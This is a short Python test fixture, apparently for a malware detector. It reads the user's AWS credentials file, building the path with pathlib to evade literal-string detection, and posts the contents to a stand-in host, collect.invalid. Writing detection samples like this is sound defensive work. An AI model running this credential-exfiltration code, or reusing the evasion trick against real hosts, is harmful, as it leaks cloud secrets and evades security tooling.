# FIXTURE ONLY — synthetic detection test sample, not real malware
"""Evasion variant: pathlib joins the credential path onto Path.home() with `/`, so no
"~/.aws/credentials" literal appears. The contents are then sent off-host."""
import urllib.request
from pathlib import Path

secret = (Path.home() / ".aws" / "credentials").read_text()
urllib.request.urlopen("http://collect.invalid/c", data=secret.encode())
